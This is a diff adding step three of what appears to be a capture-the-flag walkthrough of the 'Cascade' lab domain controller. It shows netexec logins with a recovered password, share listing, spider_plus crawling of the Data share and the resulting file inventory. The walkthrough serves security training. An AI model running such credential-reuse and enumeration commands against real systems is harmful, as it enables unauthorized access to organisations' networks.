@@ -76,3 +76,183 @@ SMB         10.129.188.71   445    CASC-DC1         [-] cascade.local\arksvc:rY4
 SMB         10.129.188.71   445    CASC-DC1         [-] cascade.local\s.smith:rY4n5eva STATUS_LOGON_FAILURE 
 SMB         10.129.188.71   445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
 ```
+
+
+## STEP 3
+```sh
+└─$ netexec smb 10.129.188.71 -u r.thompson -p rY4n5eva --shares
+SMB         10.129.188.71   445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False) 
+SMB         10.129.188.71   445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
+SMB         10.129.188.71   445    CASC-DC1         [*] Enumerated shares
+SMB         10.129.188.71   445    CASC-DC1         Share           Permissions     Remark
+SMB         10.129.188.71   445    CASC-DC1         -----           -----------     ------
+SMB         10.129.188.71   445    CASC-DC1         ADMIN$                          Remote Admin
+SMB         10.129.188.71   445    CASC-DC1         Audit$                          
+SMB         10.129.188.71   445    CASC-DC1         C$                              Default share
+SMB         10.129.188.71   445    CASC-DC1         Data            READ            
+SMB         10.129.188.71   445    CASC-DC1         IPC$                            Remote IPC
+SMB         10.129.188.71   445    CASC-DC1         NETLOGON        READ            Logon server share 
+SMB         10.129.188.71   445    CASC-DC1         print$          READ            Printer Drivers
+SMB         10.129.188.71   445    CASC-DC1         SYSVOL          READ            Logon server share 
+              
+└─$ netexec smb 10.129.188.71 -u r.thompson -p rY4n5eva --share Data -M spider_plus 
+SMB         10.129.188.71   445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False) 
+SMB         10.129.188.71   445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
+SPIDER_PLUS 10.129.188.71   445    CASC-DC1         [*] Started module spidering_plus with the following options:
+SPIDER_PLUS 10.129.188.71   445    CASC-DC1         [*]  DOWNLOAD_FLAG: False
+SPIDER_PLUS 10.129.188.71   445    CASC-DC1         [*]     STATS_FLAG: True
+SPIDER_PLUS 10.129.188.71   445    CASC-DC1         [*] EXCLUDE_FILTER: ['print$', 'ipc$']
+SPIDER_PLUS 10.129.188.71   445    CASC-DC1         [*]   EXCLUDE_EXTS: ['ico', 'lnk']
+SPIDER_PLUS 10.129.188.71   445    CASC-DC1         [*]  MAX_FILE_SIZE: 50 KB
+SPIDER_PLUS 10.129.188.71   445    CASC-DC1         [*]  OUTPUT_FOLDER: /home/kali/.nxc/modules/nxc_spider_plus
+SMB         10.129.188.71   445    CASC-DC1         [*] Enumerated shares
+SMB         10.129.188.71   445    CASC-DC1         Share           Permissions     Remark
+SMB         10.129.188.71   445    CASC-DC1         -----           -----------     ------
+SMB         10.129.188.71   445    CASC-DC1         ADMIN$                          Remote Admin
+SMB         10.129.188.71   445    CASC-DC1         Audit$                          
+SMB         10.129.188.71   445    CASC-DC1         C$                              Default share
+SMB         10.129.188.71   445    CASC-DC1         Data            READ            
+SMB         10.129.188.71   445    CASC-DC1         IPC$                            Remote IPC
+SMB         10.129.188.71   445    CASC-DC1         NETLOGON        READ            Logon server share 
+SMB         10.129.188.71   445    CASC-DC1         print$          READ            Printer Drivers
+SMB         10.129.188.71   445    CASC-DC1         SYSVOL          READ            Logon server share 
+SPIDER_PLUS 10.129.188.71   445    CASC-DC1         [+] Saved share-file metadata to "/home/kali/.nxc/modules/nxc_spider_plus/10.129.188.71.json".
+SPIDER_PLUS 10.129.188.71   445    CASC-DC1         [*] SMB Shares:           8 (ADMIN$, Audit$, C$, Data, IPC$, NETLOGON, print$, SYSVOL)
+SPIDER_PLUS 10.129.188.71   445    CASC-DC1         [*] SMB Readable Shares:  4 (Data, NETLOGON, print$, SYSVOL)
+SPIDER_PLUS 10.129.188.71   445    CASC-DC1         [*] SMB Filtered Shares:  1
+SPIDER_PLUS 10.129.188.71   445    CASC-DC1         [*] Total folders found:  58
+SPIDER_PLUS 10.129.188.71   445    CASC-DC1         [*] Total files found:    20
+SPIDER_PLUS 10.129.188.71   445    CASC-DC1         [*] File size average:    1.07 KB
+SPIDER_PLUS 10.129.188.71   445    CASC-DC1         [*] File size min:        6 B
+SPIDER_PLUS 10.129.188.71   445    CASC-DC1         [*] File size max:        5.83 KB
+                
+└─$ cat /home/kali/.nxc/modules/nxc_spider_plus/10.129.188.71.json 
+{
+    "Data": {
+        "IT/Email Archives/Meeting_Notes_June_2018.html": {
+            "atime_epoch": "2020-01-15 20:08:46",
+            "ctime_epoch": "2020-01-15 20:08:46",
+            "mtime_epoch": "2020-01-28 13:00:30",
+            "size": "2.46 KB"
+        },
+        "IT/Logs/Ark AD Recycle Bin/ArkAdRecycleBin.log": {
+            "atime_epoch": "2020-01-10 11:19:20",
+            "ctime_epoch": "2020-01-10 11:19:20",
+            "mtime_epoch": "2020-01-28 20:19:11",
+            "size": "1.27 KB"
+        },
+        "IT/Logs/DCs/dcdiag.log": {
+            "atime_epoch": "2020-01-10 11:17:30",
+            "ctime_epoch": "2020-01-10 11:17:30",
+            "mtime_epoch": "2020-01-26 17:22:05",
+            "size": "5.83 KB"
+        },
+        "IT/Temp/s.smith/VNC Install.reg": {
+            "atime_epoch": "2020-01-28 14:27:43",
+            "ctime_epoch": "2020-01-28 14:27:43",
+            "mtime_epoch": "2020-01-28 15:00:01",
+            "size": "2.62 KB"
+        }
+    },
+    "NETLOGON": {
+        "MapAuditDrive.vbs": {
+            "atime_epoch": "2020-01-15 16:45:08",
+            "ctime_epoch": "2020-01-15 16:45:08",
+            "mtime_epoch": "2020-01-15 16:50:14",
+            "size": "258 B"
+        },
+        "MapDataDrive.vbs": {
+            "atime_epoch": "2020-01-15 16:50:28",
+            "ctime_epoch": "2020-01-15 16:49:19",
+            "mtime_epoch": "2020-01-15 16:51:03",
+            "size": "255 B"
+        }
+    },
+    "SYSVOL": {
+        "cascade.local/Policies/{2906D621-7B58-40F1-AA47-4ED2AEF29484}/GPT.INI": {
+            "atime_epoch": "2020-01-09 13:12:59",
+            "ctime_epoch": "2020-01-09 13:12:59",
+            "mtime_epoch": "2020-01-09 13:13:00",
+            "size": "59 B"
+        },
+        "cascade.local/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI": {
+            "atime_epoch": "2020-01-09 10:31:40",
+            "ctime_epoch": "2020-01-09 10:31:40",
+            "mtime_epoch": "2020-03-23 04:33:59",
+            "size": "23 B"
+        },
+        "cascade.local/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
+            "atime_epoch": "2020-01-09 10:31:40",
+            "ctime_epoch": "2020-01-09 10:31:40",
+            "mtime_epoch": "2020-03-23 04:33:59",
+            "size": "1.22 KB"
+        },
+        "cascade.local/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol": {
+            "atime_epoch": "2020-01-09 10:48:03",
+            "ctime_epoch": "2020-01-09 10:48:03",
+            "mtime_epoch": "2020-01-09 10:48:03",
+            "size": "2.72 KB"
+        },
+        "cascade.local/Policies/{322FEA29-156D-4476-8A06-1935A3525C1C}/GPO.cmt": {
+            "atime_epoch": "2020-01-09 13:29:34",
+            "ctime_epoch": "2020-01-09 13:29:34",
+            "mtime_epoch": "2020-01-09 13:30:29",
+            "size": "24 B"
+        },
+        "cascade.local/Policies/{322FEA29-156D-4476-8A06-1935A3525C1C}/GPT.INI": {
+            "atime_epoch": "2020-01-09 10:50:16",
+            "ctime_epoch": "2020-01-09 10:50:16",
+            "mtime_epoch": "2020-01-28 17:07:51",
+            "size": "64 B"
+        },
+        "cascade.local/Policies/{322FEA29-156D-4476-8A06-1935A3525C1C}/User/Scripts/scripts.ini": {
+            "atime_epoch": "2020-01-09 14:52:44",
+            "ctime_epoch": "2020-01-09 14:52:44",
+            "mtime_epoch": "2020-01-28 17:07:51",
+            "size": "6 B"
+        },
+        "cascade.local/Policies/{4026EDF8-DBDA-4AED-8266-5A04B80D9327}/GPT.INI": {
+            "atime_epoch": "2020-01-09 14:42:31",
+            "ctime_epoch": "2020-01-09 14:42:31",
+            "mtime_epoch": "2020-01-09 14:42:31",
+            "size": "59 B"
+        },
+        "cascade.local/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI": {
+            "atime_epoch": "2020-01-09 10:31:40",
+            "ctime_epoch": "2020-01-09 10:31:40",
+            "mtime_epoch": "2020-01-26 12:12:15",
+            "size": "23 B"
+        },
+        "cascade.local/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
+            "atime_epoch": "2020-01-09 10:31:40",
+            "ctime_epoch": "2020-01-09 10:31:40",
+            "mtime_epoch": "2020-01-26 12:12:15",
+            "size": "3.99 KB"
+        },
+        "cascade.local/Policies/{820E48A7-D083-4C2D-B5F8-B24462924714}/GPT.INI": {
+            "atime_epoch": "2020-01-09 13:33:51",
+            "ctime_epoch": "2020-01-09 13:33:51",
+            "mtime_epoch": "2020-01-09 13:34:03",
+            "size": "59 B"
+        },
+        "cascade.local/Policies/{D67C2AD5-44C7-4468-BA4C-199E75B2F295}/GPT.INI": {
+            "atime_epoch": "2020-01-09 14:42:40",
+            "ctime_epoch": "2020-01-09 14:42:40",
+            "mtime_epoch": "2020-01-09 14:42:40",
+            "size": "59 B"
+        },
+        "cascade.local/scripts/MapAuditDrive.vbs": {
+            "atime_epoch": "2020-01-15 16:45:08",
+            "ctime_epoch": "2020-01-15 16:45:08",
+            "mtime_epoch": "2020-01-15 16:50:14",
+            "size": "258 B"
+        },
+        "cascade.local/scripts/MapDataDrive.vbs": {
+            "atime_epoch": "2020-01-15 16:50:28",
+            "ctime_epoch": "2020-01-15 16:49:19",
+            "mtime_epoch": "2020-01-15 16:51:03",
+            "size": "255 B"
+        }
+    }
+}
+```
